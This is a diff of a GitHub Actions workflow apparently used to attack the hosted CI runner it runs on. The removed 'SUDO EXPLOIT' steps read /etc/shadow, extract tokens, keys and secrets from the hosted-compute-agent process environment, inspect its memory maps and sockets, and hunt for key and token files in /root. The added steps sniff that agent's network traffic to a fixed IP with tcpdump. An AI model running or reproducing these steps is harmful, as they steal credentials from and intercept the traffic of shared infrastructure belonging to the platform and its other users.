@@ -1,48 +1,21 @@
-name: SUDO EXPLOIT
+name: Capture HCA Traffic
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 10
     steps:
       - run: |
-          echo "=== 1. SUDO WORKS! ==="
-          sudo whoami
-          
-          echo ""
-          echo "=== 2. Read anything ==="
-          sudo cat /etc/shadow | head -5
-          
-          echo ""
-          echo "=== 3. HCA process memory ==="
           HCA_PID=$(pgrep -f hosted-compute-agent)
           echo "HCA PID: $HCA_PID"
           
-          echo ""
-          echo "=== 4. Read HCA process environ ==="
-          sudo cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE "token|key|secret|endpoint" | head -20
+          # Start tcpdump in background, capture HCA's traffic
+          sudo tcpdump -i any -s 0 -X -c 50 host 20.75.202.224 2>/dev/null &
+          TCPDUMP_PID=$!
+          sleep 30  # Capture for 30 seconds
+          kill $TCPDUMP_PID 2>/dev/null
+          wait $TCPDUMP_PID 2>/dev/null
           
-          echo ""
-          echo "=== 5. Install tcpdump and capture ==="
-          sudo apt-get update -qq 2>/dev/null && sudo apt-get install -y -qq tcpdump 2>/dev/null
-          which tcpdump
-          
-          echo ""
-          echo "=== 6. Read process maps ==="
-          sudo cat /proc/$HCA_PID/maps 2>/dev/null | head -20
-          
-          echo ""
-          echo "=== 7. Try to access any socket fd ==="
-          sudo ls -la /proc/$HCA_PID/fd/
-          
-          echo ""
-          echo "=== 8. Check for any hidden files ==="
-          sudo find /root -type f -name "*.key" -o -name "*token*" -o -name "*secret*" -o -name "*.pem" 2>/dev/null | head -20
-          
-          echo ""
-          echo "=== 9. Check docker containers on host ==="
-          sudo docker ps -a 2>/dev/null
-          
-          echo "=== SUDO IS KING ==="
+          echo "=== tcpdump done ==="
